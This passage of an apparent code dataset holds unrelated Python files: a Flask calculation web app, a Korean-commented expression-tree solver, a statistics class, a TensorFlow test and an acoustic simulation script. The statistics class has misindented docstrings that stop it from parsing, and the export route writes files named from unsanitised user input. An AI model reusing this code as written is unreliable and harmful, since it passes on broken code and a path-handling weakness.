else:\n                    flash(\"Sorry, email not found.\", \"danger\")\n        elif register_attempt:\n            if formR.validate_on_submit():\n                emailR = formR.emailR.data\n                passwordR = formR.passwordR.data\n                first_nameR = formR.first_name.data\n                last_nameR = formR.last_name.data\n\n                user = User( email=emailR, first_name=first_nameR, last_name=last_nameR) # user_id=ObjectId(),\n                user.set_password(passwordR)\n                user.save()\n\n                flash(\"You are successfully registered\", \"success\")\n                return redirect(url_for('login'))\n\n    return render_template(\"login.html\", login=True, form=form, formR=formR)\n\n\n\n@application.route(\"/logout\")\n@store_last_page\ndef logout():\n    current_user_id = session.get('user_id')\n    # dir_path = f\"C:/Users/ayoung/encomp/application/static/jsonfiles/{current_user_id}\"\n    dir_path = f\"/home/ubuntu/encomp/application/static/jsonfiles/{current_user_id}\"\n    if os.path.exists(dir_path):\n        try:\n            shutil.rmtree(dir_path)\n        except OSError as e:\n            flash(f\"Error: {dir_path} : {e.strerror}\")\n    [session.pop(key) for key in list(session.keys())]\n    flash(\"You have been logged out.\", \"success\")\n    return redirect(url_for('index'))\n\n\n\n@application.route(\"/design_dashboard\", methods=['GET', 'POST'])\n@store_last_page\ndef design_dashboard():\n\n    if not session.get('current_calc_id'):\n        return redirect(url_for('index'))\n\n    ############------------GET CURRENT CALCULATION INFO AND DB OBJECTS-----------##############\n    current_calc = CalcInput.objects( _id = session['current_calc_id'] ).first()\n    current_calc_type = CalcType.objects( _id = current_calc.calc_type_id ).first()\n    calc_file_name = current_calc_type.file_name\n    if not current_calc:\n        return render_template(\"design.html\", calculation_name= \"No calc found for id:\",calculation_description=session['current_calc_id'])\n\n    ############------------GET CALCULATION INPUT OBJECTS BY RUNNING CALC -----------##############\n    calculation_path = f'application.calcscripts.{calc_file_name}.create_calculation'\n    calc_items_and_strings, calc_errors = compile_calculation(compile_calc_path=calculation_path)\n    calc_items = calc_items_and_strings['all_items']\n    setup_items = calc_items['setup']\n    calc_inputs = []\n    for item in setup_items:\n        if item.__class__.__name__ == 'DeclareVariable':\n            calc_inputs.append(item)\n\n\n    ############------------POPULATE CHANGE CALC NAME FORM DATA -----------##############\n    calcnameform = ChangeCalcForm()\n    left_header=current_calc.left_header\n    center_header=current_calc.center_header\n    right_header=current_calc.right_header\n    # if request.method == 'GET':\n    calcnameform.new_description.data = current_calc.description\n    calcnameform.new_left_header.data = left_header\n    calcnameform.new_center_header.data = center_header\n    calcnameform.new_right_header.data = right_header\n\n\n    ############------------CHANGE CALCULATION NAME FORM-----------##############\n    def change_calculation_name(posted_dict):\n        if calcnameform.validate_on_submit():\n            new_calc_name = posted_dict.get('new_calc_name')\n            new_description = posted_dict.get('new_description')\n            new_left_header = posted_dict.get('new_left_header')\n            new_center_header = posted_dict.get('new_center_header')\n            new_right_header = posted_dict.get('new_right_header')\n\n            current_calc.calc_name = new_calc_name\n            current_calc.description = new_description\n            current_calc.left_header = new_left_header\n            current_calc.center_header = new_center_header\n            current_calc.right_header = new_right_header\n            current_calc.save()\n\n            flash(f\"You have updated {new_calc_name}\", \"success\")\n            return redirect(url_for('design_dashboard'))\n        else:\n            flash(\"Error in text submitted\")\n            return None\n\n    ############------------DELETE CALCULATION FORM-----------##############\n    def delete_current_calculation():\n        removeCalculationFromDB(session['current_calc_id'])\n        deleted_calc_name = session.get('current_c_name')\n        session.pop('current_calc_id')\n        session.pop('current_c_name')\n        session.pop('current_c_description')\n        flash(f\"You have deleted {deleted_calc_name}\", \"success\")\n        return redirect(url_for('landing'))\n\n\n    ############------------WHEN FORM IS SUBMITTED-----------##############\n    if request.method == 'POST':\n        form_submit_dict = request.form\n        # flash(f\"posted:  {form_submit_dict}\")\n        # submitted_form = form_submit_dict.get('submit')\n        # flash(f\"submitted form: {submitted_form}\")\n        update_results     = 'update_results_submitted' in form_submit_dict\n        show_report        = 'show_calc_report' in form_submit_dict\n        print_report       = 'print_calc_report' in form_submit_dict\n        change_calc_name   = 'change_calc_name' in form_submit_dict\n        delete_calc        = 'delete_current_calc' in form_submit_dict\n        export_calc        = 'export_calc' in form_submit_dict\n        go_back            = 'go_back' in form_submit_dict\n\n        if update_results:\n            current_calc.calc_input_dict = form_submit_dict\n            current_calc.save()\n        elif show_report:\n            return redirect(url_for('calcreport', print_report=\"view\"))\n        elif print_report:\n            return redirect(url_for('calcreport', print_report=\"print\"))\n        elif change_calc_name:\n            return change_calculation_name(form_submit_dict)\n        elif delete_calc:\n            return delete_current_calculation()\n        elif export_calc:\n            return export_calculation()\n        elif go_back:\n            # get rid of current page from history list, then go to previous page\n            session.get('global_page_history').pop()\n            return redirect(url_for(session.get('global_page_history').pop()))\n\n\n    ############------------RENDER INPUT AND OUTPUT VALUES-----------##############\n    # update input variables\n    calc_saved_input = current_calc.calc_input_dict\n    if isinstance(calc_saved_input, dict):\n        for item in calc_inputs:\n            var_name = item.name\n            saved_input = calc_saved_input.get(var_name)\n            if saved_input:\n                item._set_value(saved_input)\n\n            else:\n                calc_saved_input[var_name] = item.value\n        current_calc.calc_input_dict = calc_saved_input\n        current_calc.save()\n\n    else:\n        current_calc.calc_input_dict = {'a': 3, 'b': 4}\n        current_calc.save()\n\n    #  get calculation output objects\n    calc_items_and_strings, calc_errors = compile_calculation(compile_calc_path=calculation_path, compile_update_vals=True, compile_updated_items=calc_inputs)\n    if calc_errors:\n        flash(calc_errors)\n    calc_items = calc_items_and_strings['all_items']\n    result_items = calc_items['calc']\n    calc_results = []\n    for item in result_items:\n        if item.__class__.__name__ == 'CalcVariable' or item.__class__.__name__ == 'CheckVariable':\n            if item.result_check:\n                calc_results.append(item)\n\n    # SAVE HTML STRINGS FOR CALC REPORT\n    stringsdict = calc_items_and_strings['html_strings']\n    session['stringsdict'] = stringsdict\n\n    return render_template(\"design.html\", calculation_name= current_calc.calc_name,calculation_description=current_calc.description, calc_inputs=calc_inputs, calc_results=calc_results, calcnameform=calcnameform,  design=True)\n\n\n\n@application.route(\"/calcreport\", methods=['GET', 'POST'])\n@store_last_page\ndef calcreport(print_report):\n    current_calc = CalcInput.objects( _id = session['current_calc_id'] ).first()\n    current_calc_type = CalcType.objects( _id = current_calc.calc_type_id ).first()\n    calc_name = current_calc_type.type_name\n\n    left_header = current_calc.left_header\n    center_header = current_calc.center_header\n    right_header = current_calc.right_header\n\n    stringsdict = session.get('stringsdict')\n\n\n    headstrings = stringsdict['head']\n    assumstrings = stringsdict['assum']\n    assum_length = len(assumstrings)\n    setupstrings = stringsdict['setup']\n    calcstrings = stringsdict['calc']\n\n    return render_template(\"calculations/view_calc_report.html\", print_report=print_report, calc_title = calc_name, headstrings = headstrings, assumstrings = assumstrings, assum_length=assum_length, setupstrings=setupstrings, calcstrings=calcstrings, left_header=left_header, center_header=center_header, right_header=right_header )\n\n\n\n@application.route(\"/exportcalculation\")\n@store_last_page\ndef export_calculation():\n    if not session.get('user_id') or not session.get('current_calc_id'):\n        return redirect(url_for('index'))\n    current_user_id = session.get('user_id')\n    if current_calc := CalcInput.objects(\n        _id=session['current_calc_id']\n    ).first():\n        calc_file_name =  current_calc.calc_name.replace(\" \", \"_\")\n        calc_export_dict = {'calc_name': current_calc.calc_name, 'description': current_calc.description, 'calc_type_id': str(current_calc.calc_type_id), 'calc_input_dict': current_calc.calc_input_dict, 'left_header': current_calc.left_header, 'center_header': current_calc.center_header, 'right_header': current_calc.right_header}\n        # file_path = f\"C:/Users/ayoung/encomp/application/static/jsonfiles/{current_user_id}/{calc_file_name}.json\"\n        file_path = f\"/home/ubuntu/encomp/application/static/jsonfiles/{current_user_id}/{calc_file_name}.json\"\n        # dir_path = f\"C:/Users/ayoung/encomp/application/static/jsonfiles/{current_user_id}\"\n        dir_path = f\"/home/ubuntu/encomp/application/static/jsonfiles/{current_user_id}\"\n        if not os.path.exists(dir_path):\n            os.makedirs(dir_path)\n        with open(file_path,\"w\") as file:\n            json.dump(calc_export_dict,file)\n        return send_file(file_path, as_attachment=True, attachment_filename=f\"{calc_file_name}_export.json\")\n    else:\n        flash(\"Current calculation not found.\", \"danger\")\n\n@application.route(\"/api/testing\", methods=[\"GET\", \"POST\"])\ndef test_api():\n    if input_json := request.json:\n        a = input_json.get(\"a\", 0)\n        b = input_json.get(\"b\", 0)\n        return {'sum':a+b, \"product\":a*b}\n    return \"No input given\"\n\n@application.route(\"/api/ConcreteBeam\", methods=[\"GET\", \"POST\"])\ndef concrete_beam_api():\n    if not (input_json := request.json):\n        return \"No input given\"\n    calc_file_name = 'ConcreteBeam'\n\n    ############------------GET CALCULATION INPUT OBJECTS BY RUNNING CALC -----------##############\n    calculation_path = f'application.calcscripts.{calc_file_name}.create_calculation'\n    calc_items_and_strings, calc_errors = compile_calculation(compile_calc_path=calculation_path)\n    # if calc_errors:\n    #     print(calc_errors)\n    calc_items = calc_items_and_strings['all_items']\n    setup_items = calc_items['setup']\n    calc_inputs = [\n        item\n        for item in setup_items\n        if item.__class__.__name__ in ['DeclareVariable', 'DeclareTable']\n    ]\n\n        ############------------UPDATE INPUTS, RUN CALC, AND GET OUTPUT VALUES-----------##############\n        # update input variables\n    if isinstance(input_json, dict):\n\n        for item in calc_inputs:\n            var_name = item.name\n            if input_val := input_json.get(var_name):\n                item._set_value(input_val)\n            else:\n                input_json[var_name] = item.value\n\n    #  get calculation output objects\n    calc_items_and_strings, calc_errors = compile_calculation(compile_calc_path=calculation_path, compile_update_vals=True, compile_updated_items=calc_inputs)\n    # if calc_errors:\n    #     print(calc_errors)\n    calc_items = calc_items_and_strings['all_items']\n    result_items = calc_items['calc']\n        # SAVE HTML STRINGS FOR CALC REPORT\n        # stringsdict = calc_items_and_strings['html_strings']\n        # session['stringsdict'] = stringsdict\n\n    return {\n        item.name: item.result()\n        for item in result_items\n        if item.__class__.__name__ in ['CalcVariable', 'CalcTable']\n        and item.result_check\n    }\n", "417": "import sys\nsys.stdin = open('input.txt')\n\n\n# \ud6c4\uc704 \uc21c\ud68c\ub85c \ud53c\uc5f0\uc0b0\uc790\uc640 \uc5f0\uc0b0\uc790\ub97c \ucc44\uc6cc\uc8fc\ub294 \ud568\uc218 \ub9cc\ub4e4\uae30\ndef postorder(T):\n    if T:\n        postorder(cl[T])\n        postorder(cr[T])\n        calc.append(num_list[T])\n\n# input\uac12 \uc785\ub825\ud558\uae30\nT = 10\nfor tc in range(1, T+1):\n    N = int(input())\n\n    num_list = [0] * (N+1)  # \uc5f0\uc0b0\uc790\uc640 \ud53c\uc5f0\uc0b0\uc790\ub97c \ubc1b\uc744 num_list \ub9ac\uc2a4\ud2b8 \uc0dd\uc131\n    cl = [0] * (N+1)        # \uc67c\ucabd \uc790\uc2dd \ub178\ub4dc \ub9ac\uc2a4\ud2b8 \uc0dd\uc131\n    cr = [0] * (N+1)        # \uc624\ub978\ucabd \uc790\uc2dd \ub178\ub4dc \ub9ac\uc2a4\ud2b8 \uc0dd\uc131\n\n    # for\ubb38\uc744 \uc774\uc6a9\ud574 \uc5f0\uc0b0\uc790\uc640 \ud53c\uc5f0\uc0b0\uc790, \ud2b8\ub9ac \ub178\ub4dc \uc815\ubcf4\ub4e4\uc744 \uc54c\ub9de\uc740 \ub9ac\uc2a4\ud2b8\uc5d0 \ub204\uc801\n    for _ in range(N):\n        val = list(input().split())\n        if len(val) == 2:                           # input \uac12\uc774 \ub450\uac1c\uc778 \uacbd\uc6b0\n            num_list[int(val[0])] = float(val[1])   # -> num_list\uc5d0 \ud53c\uc5f0\uc0b0\uc790 \ub204\uc801 (float \ud0c0\uc785)\n        else:                                       # input \uac12\uc774 \ub124\uac1c\uc778 \uacbd\uc6b0\n            num_list[int(val[0])] = str(val[1])     # -> num_list\uc5d0 \uc5f0\uc0b0\uc790 \ub204\uc801 (str \ud0c0\uc785)\n            cl[int(val[0])] = int(val[2])           # -> \ubd80\ubaa8 \ub178\ub4dc \ubc88\ud638\ub97c \uc67c\ucabd \uc790\uc2dd \ub178\ub4dc \ub9ac\uc2a4\ud2b8\uc5d0 \ub123\uae30\n            cr[int(val[0])] = int(val[3])           # -> \ubd80\ubaa8 \ub178\ub4dc \ubc88\ud638\ub97c \uc624\ub978\ucabd \uc790\uc2dd \ub178\ub4dc \ub9ac\uc2a4\ud2b8\uc5d0 \ub123\uae30\n\n    calc = []       # \uc5f0\uc0b0\uc790\uc640 \ud53c\uc5f0\uc0b0\uc790\ub97c \uacc4\uc0b0\ud560 \uc21c\uc11c\ub85c \ub2f4\uc744 calc \ub9ac\uc2a4\ud2b8 \uc0dd\uc131\n    postorder(1)    # \ud6c4\uc704 \uc21c\ud68c \ud568\uc218\ub97c \uc774\uc6a9\ud574 calc \ub9ac\uc2a4\ud2b8\uc5d0 \ub2f4\uae30\n\n    calc_stack =[]  # \uacc4\uc0b0\uc744 \ud560\ub54c \ud65c\uc6a9\ud560 calc_stack \uc774\ub77c\ub294 \ube48 \uc2a4\ud0dd \uc0dd\uc131\n\n    # while\ubb38\uc744 \uc774\uc6a9\ud574 \uacc4\uc0b0 \uc9c4\ud589\ud558\uae30\n    while calc:\n        curr = calc.pop(0)              # calc \ub9ac\uc2a4\ud2b8\uc5d0\uc11c \uccab\ubc88\uc9f8 \uc778\uc790 \uaebc\ub0b4\uae30\n        if type(curr) == float:         # \uaebc\ub0b8 \uc778\uc790\uac00 \uc22b\uc790\uc778 \uacbd\uc6b0,\n            calc_stack.append(curr)     # -> \ud574\ub2f9 \uc22b\uc790\ub97c calc_stack \uc5d0 \uc313\uae30\n        else:                           # \uaebc\ub0b8 \uc778\uc790\uac00 \uc5f0\uc0b0\uc790\uc778 \uacbd\uc6b0,\n            num2 = calc_stack.pop()     # calc_stack\uc5d0\uc11c \uc22b\uc790\ub97c \uaebc\ub0b4\uc11c num2\ub85c \uc9c0\uc815\n            num1 = calc_stack.pop()     # calc_stack\uc5d0\uc11c \uc22b\uc790\ub97c \uaebc\ub0b4\uc11c num1\uc73c\ub85c \uc9c0\uc815\n            if curr == '+':                         # \uc778\uc790\uac00 + \uc778 \uacbd\uc6b0,\n                calc_stack.append(num1 + num2)      # -> \ub450 \uc218\uc758 \ud569\uc744 calc_stack\uc5d0 \uc313\uae30\n            elif curr == '-':                       # \uc778\uc790\uac00 - \uc778 \uacbd\uc6b0,\n                calc_stack.append(num1 - num2)      # -> \ub450 \uc218\uc758 \ucc28\ub97c calc_stack\uc5d0 \uc313\uae30\n            elif curr == '*':                       # \uc778\uc790\uac00 * \uc778 \uacbd\uc6b0,\n                calc_stack.append(num1 * num2)      # -> \ub450 \uc218\uc758 \uacf1\uc744 calc_stack\uc5d0 \uc313\uae30\n            elif curr == '/':                       # \uc778\uc790\uac00 / \uc778 \uacbd\uc6b0,\n                calc_stack.append(num1 / num2)      # -> \ub450 \uc218\uc758 \ube44\ub97c calc_stack\uc5d0 \uc313\uae30\n\n    rlt = int(calc_stack[0])    # calc_stack\uc5d0 \ub0a8\uc544\uc788\ub294 \ud558\ub098\uc758 \uc22b\uc790\ub97c int \ud615\uc2dd\uc73c\ub85c \ubcc0\ud658 \ud6c4, rlt \ubcc0\uc218\uc5d0 \uc800\uc7a5\n\n    # \uacb0\uacfc \ucd9c\ub825\n    print(f'#{tc} {rlt}')", "418": "from typing import List\nclass DescriptiveStats:\n\n    def calc_count(self,x: List[float]) -> int:\n        \"\"\"Returns the number of data points in a data set\"\"\"\n        return len(x)\n\n    def calc_minimum(self,x: List[float]) -> float:\n        \"\"\"Returns the lowest data point in a data set\"\"\"\n        return min(x)\n\n    def calc_maximum(self,x: List[float]) -> float:\n        \"\"\"Returns the highest data point in a data set\"\"\"\n        return max(x)\n\n    def calc_range(self,x: List[float]) -> float:\n    \"\"\"Returns the difference between the lowest and highest values in a data set\"\"\"\n        return self.calc_maximum(x) - self.calc_minimum(x)\n\n    def calc_mean(self,x: List[float]) -> float:\n    \"\"\"Returns the average value of a data set\"\"\"\n        return sum(x) / self.calc_count(x)\n\n    def calc_median(self,x: List[float]) -> float:\n       \"\"\"Returns the middle value of a data set\"\"\"\n        if self.calc_count(x) % 2 == 1:\n            return sorted(x)[self.calc_count(x) // 2]\n        if self.calc_count(x) % 2 == 0:\n            return ((sorted(x)[(self.calc_count(x) // 2) - 1]) + \\\n                    (sorted(x)[self.calc_count(x) // 2])) / 2\n\n    def calc_quantile(self,x: List[float], y: float) -> float:\n    \"\"\"Returns a particular part of a data set\"\"\"\n        return sorted(x)[int(y * self.calc_count(x))]\n\n    def calc_interquantile_range(self,x: List[float]) -> float:\n    \"\"\"Returns the difference in value between the upper quartile and lower quartile of a data set\"\"\"\n        return self.calc_quantile(x, 0.75) - self.calc_quantile(x, 0.25)\n\n    def calc_mode(self,x: List[float]) -> List[float]:\n    \"\"\"Returns the number that is repeated most  in a data set\"\"\"\n        frequency_dict = {}\n        for i in x:\n            if i not in frequency_dict:\n                frequency_dict[i] = 1\n            else:\n                frequency_dict[i] += 1\n        modes = []\n        highest_frequency = sorted(frequency_dict.values())[-1]\n        for key, value in frequency_dict.items():\n            if value == highest_frequency:\n                modes.append(key)\n        return modes\n\n    def calc_variance(self,x: List[float]) -> float:\n    \"\"\"Returns the variability from the mean of a data set\"\"\"\n        assert self.calc_count(x) >= 2, \"Variance requires at least two elements\"\n        return sum([(i - (self.calc_mean(x)))**2 for i in x]) / self.calc_count(x)\n\n    def calc_bessel_variance(self,x: List[float]) -> float:\n       \"\"\"Returns the variability from the mean of a data set\"\"\"\n        assert self.calc_count(x) >= 2, \"Variance requires at least two elements\"\n        return sum([(i - (self.calc_mean(x)))**2 for i in x]) / (self.calc_count(x) - 1)\n\n    def calc_standard_deviation(self,x: List[float]) -> float:\n        \"\"\"Returns the dispersion of a dataset relative to its mean and is\n        calculated as the square root of the\n        variance\"\"\"\n        assert self.calc_count(x) >= 2, \"Standard Deviation requires at least two \" \\\n        \"elements\"\n        return (sum([(i - (self.calc_mean(x)))**2 for i in x]) / self.calc_count(x))**0.5\n\n    def calc_bessel_standard_deviation(self,x: List[float]) -> float:\n        \"\"\"Bessel's correction is the use of n - 1 instead of n in the formula for the sample variance and sample standard deviation\"\"\"\n        assert self.calc_count(x) >= 2, \"Standard Deviation requires at least two \" \\\n        \"elements\"\n        return (sum([(i - (self.calc_mean(x)))**2 for i in x]) / \\\n                (self.calc_count(x) - 1))**0.5\n\n    def calc_covariance(self,x: List[float], y: List[float]) -> float:\n        \"\"\"Returns how much two random variables vary together.\"\"\"\n        assert self.calc_count(x) == self.calc_count(y), \"x and y must contain the same \" \\\n        \"number of elements\"\n        return sum([(i - (self.calc_mean(x))) * (j - (self.calc_mean(y))) for i, \\\n                    j in zip(x, y)]) / (self.calc_count(x) - 1)\n\n    def calc_correlation(self,x: List[float], y: List[float]) -> float:\n        \"\"\"Returns the strength of the relationship between the relative movements of two variables\"\"\"\n        if self.calc_bessel_standard_deviation(x) > 0 and \\\n        self.calc_bessel_standard_deviation(y) > 0:\n            return self.calc_covariance(x, y) / self.calc_bessel_standard_deviation(x) / \\\n            self.calc_bessel_standard_deviation(y)\n        else:\n            return 0\n", "419": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "420": "# -*- coding: utf-8 -*-\r\n\"\"\"\r\nMain Module\r\n\"\"\"\r\nimport transducer\r\nimport field\r\nimport medium\r\nimport output\r\nimport logging\r\nimport sys\r\nimport os\r\nimport time\r\nimport analytic_calc\r\nimport ribs\r\nimport rayleigh\r\n\r\ndef main_test_num():\r\n\tnew_work_dir_with_time_stamp()\r\n\tprepare_logging()\r\n\r\n\tarray = transducer.transducer_from_file(r\"..\\array.txt\")\r\n\tarray.add_elements_from_file(r\"..\\array_elements.txt\")\r\n\t# array.switch_off_elements_from_file(ur\"d:\\Educ\\\u0410\u041a\u0423\u0421\u0422\u0418\u041a\u0410\\.Current\\\u0420\u0430\u0441\u0447\u0435\u0442 \u0430\u043a \u043f\u043e\u043b\u044f \u0440\u0435\u0448\u0435\u0442\u043a\u0438\\CalcPy\\HandOffElements.txt\")\r\n\t# array.switch_off_elements_from_file(ur\"d:\\Downloads Projects\\\u0420\u0430\u0441\u0447\u0435\u0442 \u0434\u043b\u044f \u0441\u0442\u0430\u0442\u044c\u0438\\switched_off.txt\")\r\n\r\n\tmed = medium.medium_from_file(r\"..\\medium.txt\")\r\n\r\n\tcalc_field = field.PressureFieldCartesian()\r\n\tcalc_field.set_nodes_num(341, 341, 1)\r\n\tcalc_field.set_grid_bottom(-100.0e-03, -100.0e-03, 45.0e-03)\r\n\tcalc_field.set_grid_top(100.0e-03, 100.0e-03, 45.0e-03)\r\n\t# calc_field.set_nodes_num(1, 1, 131)\r\n\t# calc_field.set_grid_bottom(0.0e-03, 0.0e-03, 1.0e-03)\r\n\t# calc_field.set_grid_top(0.0e-03, 0.0e-03, 130.0e-03)\r\n\tcalc_field.prepare_grid()\r\n\r\n\t# # calc_field = field.PressureFieldCartesian()\r\n\t# # calc_field.set_nodes_num(1, 121, 121)\r\n\t# # calc_field.set_grid_bottom(0.0e-03, -60.0e-03, 70.0e-03)\r\n\t# # calc_field.set_grid_top(0.0e-03, 60.0e-03, 190.0e-03)\r\n\t# # calc_field.prepare_grid()\r\n\r\n\t# array.set_focus_from_file(r\"d:\\Educ\\\u0410\u041a\u0423\u0421\u0422\u0418\u041a\u0410\\.Current\\\u0420\u0430\u0441\u0447\u0435\u0442 \u0430\u043a \u043f\u043e\u043b\u044f \u0440\u0435\u0448\u0435\u0442\u043a\u0438\\CalcPy\\focus.txt\")\r\n\r\n\t# -------------------------CALCULATIONS-----------------------------------------\r\n\t# analytic_calc.calc_field_analytically(calc_field, array, med)\r\n\trayleigh.calc_field_from_trans_opt(calc_field, array, med, 300)\r\n\toutput.save_field_on_disk(calc_field, \"field_plane\")\r\n\t# output.PrintCylAmpPhaseZ_Binary(calc_field, 1, 1)\r\n\r\ndef main():\r\n\tnew_work_dir_with_time_stamp()\r\n\tprepare_logging()\r\n\r\n\tarray = transducer.transducer_from_file(r\"d:\\Downloads Projects\\\u0420\u0430\u0441\u0447\u0435\u0442 \u0434\u043b\u044f \u0441\u0442\u0430\u0442\u044c\u0438\\array.txt\")\r\n\tarray.add_elements_from_file(r\"d:\\Downloads Projects\\\u0420\u0430\u0441\u0447\u0435\u0442 \u0434\u043b\u044f \u0441\u0442\u0430\u0442\u044c\u0438\\array_elements.txt\")\r\n\t# array.switch_off_elements_from_file(ur\"d:\\Educ\\\u0410\u041a\u0423\u0421\u0422\u0418\u041a\u0410\\.Current\\\u0420\u0430\u0441\u0447\u0435\u0442 \u0430\u043a \u043f\u043e\u043b\u044f \u0440\u0435\u0448\u0435\u0442\u043a\u0438\\CalcPy\\HandOffElements.txt\")\r\n\t# array.switch_off_elements_from_file(ur\"d:\\Downloads Projects\\\u0420\u0430\u0441\u0447\u0435\u0442 \u0434\u043b\u044f \u0441\u0442\u0430\u0442\u044c\u0438\\switched_off.txt\")\r\n\r\n\tmed = medium.medium_from_file(r\"d:\\Downloads Projects\\\u0420\u0430\u0441\u0447\u0435\u0442 \u0434\u043b\u044f \u0441\u0442\u0430\u0442\u044c\u0438\\medium.txt\")\r\n\r\n\tcalc_field = field.PressureFieldCartesian()\r\n\t# calc_field.set_nodes_num(341, 341, 1)\r\n\t# calc_field.set_grid_bottom(-85.0e-03, -85.0e-03, 45.0e-03)\r\n\t# calc_field.set_grid_top(85.0e-03, 85.0e-03, 45.0e-03)\r\n\tcalc_field.set_nodes_num(1, 1, 131)\r\n\tcalc_field.set_grid_bottom(0.0e-03, 0.0e-03, 1.0e-03)\r\n\tcalc_field.set_grid_top(0.0e-03, 0.0e-03, 130.0e-03)\r\n\tcalc_field.prepare_grid()\r\n\r\n\t# # calc_field = field.PressureFieldCartesian()\r\n\t# # calc_field.set_nodes_num(1, 121, 121)\r\n\t# # calc_field.set_grid_bottom(0.0e-03, -60.0e-03, 70.0e-03)\r\n\t# # calc_field.set_grid_top(0.0e-03, 60.0e-03, 190.0e-03)\r\n\t# # calc_field.prepare_grid()\r\n\r\n\tarray.set_focus_from_file(r\"d:\\Educ\\\u0410\u041a\u0423\u0421\u0422\u0418\u041a\u0410\\.Current\\\u0420\u0430\u0441\u0447\u0435\u0442 \u0430\u043a \u043f\u043e\u043b\u044f \u0440\u0435\u0448\u0435\u0442\u043a\u0438\\CalcPy\\focus.txt\")\r\n\r\n\t# -------------------------CALCULATIONS-----------------------------------------\r\n\tanalytic_calc.calc_field_analytically(calc_field, array, med)\r\n\toutput.save_field_on_disk(calc_field, \"field_plane\")\r\n\t# output.PrintCylAmpPhaseZ_Binary(calc_field, 1, 1)\r\n\r\ndef main_one_el():\r\n\tnew_work_dir_with_time_stamp()\r\n\tprepare_logging()\r\n\r\n\tarray = transducer.transducer_from_file(r\"..\\\\array.txt\")\r\n\tarray.add_element(\"0\", 0.0, 0.0)\r\n\tmed = medium.medium_from_file(r\"..\\water_medium.txt\")\r\n\t# array.add_elements_from_file(r\"array_elements.txt\")\r\n\t# array.switch_off_elements_from_file(ur\"d:\\Educ\\\u0410\u041a\u0423\u0421\u0422\u0418\u041a\u0410\\.Current\\\u0420\u0430\u0441\u0447\u0435\u0442 \u0430\u043a \u043f\u043e\u043b\u044f \u0440\u0435\u0448\u0435\u0442\u043a\u0438\\CalcPy\\HandOffElements.txt\")\r\n\t# array.switch_off_elements_from_file(ur\"d:\\Downloads Projects\\\u0420\u0430\u0441\u0447\u0435\u0442 \u0434\u043b\u044f \u0441\u0442\u0430\u0442\u044c\u0438\\switched_off.txt\")\r\n\r\n\tcalc_field = field.PressureFieldCartesian()\r\n\t# calc_field.set_nodes_num(341, 341, 1)\r\n\t# calc_field.set_grid_bottom(-85.0e-03, -85.0e-03, 45.0e-03)\r\n\t# calc_field.set_grid_top(85.0e-03, 85.0e-03, 45.0e-03)\r\n\tcalc_field.set_nodes_num(1, 1, 2601)\r\n\tcalc_field.set_grid_bottom(0.0e-03, 0.0e-03, 0.1e-03)\r\n\tcalc_field.set_grid_top(0.0e-03, 0.0e-03, 150.0e-03)\r\n\tcalc_field.prepare_grid()\r\n\r\n\t# # calc_field = field.PressureFieldCartesian()\r\n\t# # calc_field.set_nodes_num(1, 121, 121)\r\n\t# # calc_field.set_grid_bottom(0.0e-03, -60.0e-03, 70.0e-03)\r\n\t# # calc_field.set_grid_top(0.0e-03, 60.0e-03, 190.0e-03)\r\n\t# # calc_field.prepare_grid()\r\n\r\n\t# array.set_focus_from_file(r\"d:\\Educ\\\u0410\u041a\u0423\u0421\u0422\u0418\u041a\u0410\\.Current\\\u0420\u0430\u0441\u0447\u0435\u0442 \u0430\u043a \u043f\u043e\u043b\u044f \u0440\u0435\u0448\u0435\u0442\u043a\u0438\\CalcPy\\focus.txt\")\r\n\r\n\t# # -------------------------CALCULATIONS-----------------------------------------\r\n\t# analytic_calc.calc_field_analytically(calc_field, array, med)\r\n\tanalytic_calc.calc_exact_on_axis(calc_field, array, med)\r\n\r\n\toutput.save_field_on_disk(calc_field, \"field_Z\")\r\n\t# output.PrintCylAmpPhaseZ_Binary(calc_field, 1, 1)\r\n\r\n\r\ndef main_1d():\r\n\tnew_work_dir_with_time_stamp()\r\n\tprepare_logging()\r\n\r\n\tarray = transducer.transducer_from_file(r\"..\\\\array.txt\")\r\n\tarray.add_elements_from_file(r\"..\\\\array_elements.txt\")\r\n\tmed = medium.medium_from_file(r\"..\\water_medium.txt\")\r\n\t# array.add_elements_from_file(r\"array_elements.txt\")\r\n\t# 